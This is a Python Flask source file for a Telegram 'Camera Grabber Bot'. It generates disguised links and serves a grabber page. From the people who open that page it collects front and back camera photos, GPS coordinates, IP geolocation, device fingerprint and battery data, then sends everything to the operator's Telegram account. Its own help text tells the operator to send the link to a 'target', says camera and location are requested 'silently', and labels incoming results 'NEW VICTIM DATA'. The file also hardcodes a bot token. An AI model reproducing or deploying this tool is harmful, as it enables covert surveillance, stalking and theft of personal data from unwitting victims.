import os
import json
import logging
import requests
from flask import Flask, request, jsonify, render_template_string
from urllib.parse import quote

app = Flask(__name__)

# ─── CONFIG ────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8699920822:AAHuxlRhoUPvo2tkCu9_ENb4YZ_oLLWJo4w")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "8505747325"))  # Your Telegram user ID
BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
VERCEL_URL = os.environ.get("VERCEL_URL", "https://your-project.vercel.app")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ─── HTML GRABBER PAGE (loaded from templates/grabber.html) ────────────────
with open("templates/grabber.html", "r", encoding="utf-8") as f:
    GRABBER_HTML = f.read()

def render_grabber_page(custom_url=""):
    """Inject the victim's target URL into the grabber page so it displays an iframe."""
    return GRABBER_HTML.replace("{{TARGET_URL}}", custom_url or "https://www.google.com")

def send_telegram(chat_id, text, parse_mode="HTML"):
    """Send a text message to Telegram."""
    url = f"{BASE_URL}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode,
        "disable_web_page_preview": True
    }
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        logger.error(f"Telegram send error: {e}")

def send_photo(chat_id, photo_url, caption=""):
    """Send a photo to Telegram (base64 or URL)."""
    url = f"{BASE_URL}/sendPhoto"
    payload = {
        "chat_id": chat_id,
        "photo": photo_url,
        "caption": caption,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, json=payload, timeout=15)
    except Exception as e:
        logger.error(f"Telegram sendPhoto error: {e}")

def send_file(chat_id, file_path, caption=""):
    """Upload a file (photo/video) from local path."""
    url = f"{BASE_URL}/sendDocument"
    try:
        with open(file_path, "rb") as f:
            files = {"document": f}
            data = {"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"}
            requests.post(url, files=files, data=data, timeout=20)
        os.remove(file_path)
    except Exception as e:
        logger.error(f"Telegram sendDocument error: {e}")

def set_webhook():
    """Register the webhook with Telegram (call once manually)."""
    webhook_url = f"{VERCEL_URL}/webhook"
    resp = requests.get(f"{BASE_URL}/setWebhook?url={webhook_url}", timeout=10)
    logger.info(f"Webhook set: {resp.json()}")
    return resp.json()

# ─── BOT COMMANDS ──────────────────────────────────────────────────────────

def handle_start(chat_id, text):
    """Handle /start command."""
    parts = text.strip().split()
    
    # If user sends a URL after /start, generate a link
    if len(parts) > 1:
        target_url = parts[1]
        generate_link(chat_id, target_url)
        return
    
    msg = (
        "🤖 <b>Camera Grabber Bot</b>\n\n"
        "Commands:\n"
        "/start <url> — Generate a grabber link with a masked page\n"
        "/help — Show this message\n\n"
        "<b>How to use:</b>\n"
        "1. Send /start https://example.com\n"
        "2. Bot sends you a grabber link\n"
        "3. Send that link to target\n"
        "4. When they open it, you get their info!\n\n"
        "⚠️ Authorized testing only."
    )
    send_telegram(chat_id, msg)

def handle_help(chat_id):
    msg = (
        "📖 <b>Help</b>\n\n"
        "Send: <code>/start https://target-site.com</code>\n"
        "The bot will generate a grabber URL you can share.\n\n"
        "<b>Data captured:</b>\n"
        "• Front & Back Camera photos\n"
        "• Live GPS Location (Google Maps link)\n"
        "• IP Address + full geolocation\n"
        "• Device: OS, Browser, Screen\n"
        "• Battery percentage\n"
        "• User-Agent & full fingerprint\n"
        "• Network info\n"
        "• Pincode/City/State/Country\n\n"
        "Bot hosted on Vercel — reply with grabbed data."
    )
    send_telegram(chat_id, msg)

def generate_link(chat_id, target_url):
    """Generate the grabber link using the Vercel deployment URL."""
    encoded_url = quote(target_url)
    grabber_url = f"{VERCEL_URL}/grab?url={encoded_url}"
    
    # Also create a shorter version using the /g path
    short_url = f"{VERCEL_URL}/g?u={encoded_url[:50]}"
    
    msg = (
        "✅ <b>Grabber Link Generated!</b>\n\n"
        f"🔗 <b>Main Link:</b>\n<code>{grabber_url}</code>\n\n"
        f"🔗 <b>Short Link:</b>\n<code>{short_url}</code>\n\n"
        "📌 <b>Instructions:</b>\n"
        "1. Copy the link above\n"
        "2. (Optional) Shorten with bit.ly or any URL shortener\n"
        "3. Send to target\n"
        "4. When they open it, you'll receive data here!\n\n"
        f"🔄 <i>Target will see: {target_url}</i>\n"
        "📷 Camera + 📍 Location will be requested silently."
    )
    send_telegram(chat_id, msg)

# ─── ROUTES ────────────────────────────────────────────────────────────────

@app.route("/webhook", methods=["POST"])
def webhook():
    """Receive updates from Telegram."""
    try:
        update = request.get_json()
        logger.info(f"Webhook update: {json.dumps(update, indent=2)[:200]}")
        
        if "message" not in update:
            return "ok", 200
        
        msg = update["message"]
        chat_id = msg["chat"]["id"]
        text = msg.get("text", "")
        
        if text.startswith("/start"):
            handle_start(chat_id, text)
        elif text.startswith("/help"):
            handle_help(chat_id)
        else:
            # Treat any text as a URL to generate a link
            if text.startswith("http"):
                generate_link(chat_id, text)
            else:
                send_telegram(chat_id, "Send /start <url> or paste a URL to generate a grabber link.")
    
    except Exception as e:
        logger.error(f"Webhook error: {e}")
    
    return "ok", 200

@app.route("/grab", methods=["GET"])
@app.route("/g", methods=["GET"])
def grab():
    """Serve the grabber HTML page to the victim."""
    target_url = request.args.get("url", "https://www.google.com")
    page = render_grabber_page(target_url)
    return page, 200, {"Content-Type": "text/html; charset=utf-8"}

@app.route("/collect", methods=["POST"])
def collect():
    """
    Receive data from the victim's browser.
    The grabber page POSTs camera images, location, device info here.
    """
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No data"}), 400
        
        victim_id = data.get("id", "unknown")
        
        # Build a comprehensive message
        info_lines = [
            "🎯 <b>NEW VICTIM DATA!</b>\n",
            f"🆔 <b>Victim ID:</b> <code>{victim_id}</code>",
        ]
        
        # IP Info
        ip_info = data.get("ip_info", {})
        if ip_info:
            info_lines.append(f"\n🌐 <b>IP:</b> <code>{ip_info.get('ip', 'N/A')}</code>")
            info_lines.append(f"📍 <b>ISP:</b> {ip_info.get('org', 'N/A')}")
            info_lines.append(f"🏙️ <b>City:</b> {ip_info.get('city', 'N/A')}")
            info_lines.append(f"🗺️ <b>Region:</b> {ip_info.get('region', 'N/A')}")
            info_lines.append(f"🇺🇳 <b>Country:</b> {ip_info.get('country_name', 'N/A')}")
            info_lines.append(f"📮 <b>Postal/Pin:</b> {ip_info.get('postal', 'N/A')}")
        
        # GPS Location
        gps = data.get("gps", {})
        if gps and gps.get("lat"):
            lat = gps["lat"]
            lon = gps["lon"]
            google_maps = f"https://www.google.com/maps?q={lat},{lon}"
            info_lines.append(f"\n📍 <b>GPS Location:</b>")
            info_lines.append(f"   Lat: <code>{lat}</code>")
            info_lines.append(f"   Lon: <code>{lon}</code>")
            info_lines.append(f"   🗺️ <a href='{google_maps}'>Open in Google Maps</a>")
            info_lines.append(f"   Accuracy: {gps.get('accuracy', 'N/A')}m")
        
        # Device Info
        device = data.get("device", {})
        if device:
            info_lines.append(f"\n📱 <b>Device Info:</b>")
            info_lines.append(f"   OS: {device.get('os', 'N/A')}")
            info_lines.append(f"   Browser: {device.get('browser', 'N/A')}")
            info_lines.append(f"   Screen: {device.get('screen', 'N/A')}")
            info_lines.append(f"   Language: {device.get('language', 'N/A')}")
            info_lines.append(f"   Platform: {device.get('platform', 'N/A')}")
            info_lines.append(f"   Cores: {device.get('cores', 'N/A')}")
            info_lines.append(f"   RAM: {device.get('ram', 'N/A')}")
        
        # Battery
        battery = data.get("battery", {})
        if battery:
            info_lines.append(f"\n🔋 <b>Battery:</b> {battery.get('level', 'N/A')}%")
            info_lines.append(f"   Charging: {battery.get('charging', 'N/A')}")
        
        # Network
        network = data.get("network", {})
        if network:
            info_lines.append(f"\n📶 <b>Network:</b> {network.get('type', 'N/A')}")
            info_lines.append(f"   Online: {network.get('online', 'N/A')}")
        
        # User-Agent
        ua = device.get("userAgent", "N/A")
        info_lines.append(f"\n📋 <b>User-Agent:</b>\n<code>{ua[:200]}</code>")
        
        final_msg = "\n".join(info_lines)
        
        # Send text info to admin
        send_telegram(ADMIN_ID, final_msg)
        
        # Send front camera photo if available
        if data.get("front_camera"):
            from base64 import b64decode
            import uuid
            
            img_data = b64decode(data["front_camera"].split(",")[1])
            filename = f"/tmp/front_{victim_id}_{uuid.uuid4().hex[:8]}.jpg"
            with open(filename, "wb") as f:
                f.write(img_data)
            send_file(ADMIN_ID, filename, f"📸 <b>Front Camera</b> — Victim: {victim_id}")
        
        # Send back camera photo if available
        if data.get("back_camera"):
            from base64 import b64decode
            import uuid
            
            img_data = b64decode(data["back_camera"].split(",")[1])
            filename = f"/tmp/back_{victim_id}_{uuid.uuid4().hex[:8]}.jpg"
            with open(filename, "wb") as f:
                f.write(img_data)
            send_file(ADMIN_ID, filename, f"📸 <b>Back Camera</b> — Victim: {victim_id}")
        
        return jsonify({"status": "success"}), 200
        
    except Exception as e:
        logger.error(f"Collect error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/setwebhook", methods=["GET"])
def set_webhook_route():
    """Manually trigger webhook setup via browser."""
    result = set_webhook()
    return jsonify(result)

@app.route("/", methods=["GET"])
def index():
    """Health check."""
    return jsonify({
        "status": "running",
        "bot": "Camera Grabber Bot",
        "endpoints": {
            "webhook": "POST /webhook",
            "grabber": "GET /grab?url=<target>",
            "collect": "POST /collect",
            "setwebhook": "GET /setwebhook"
        }
    })

# ─── MAIN ──────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
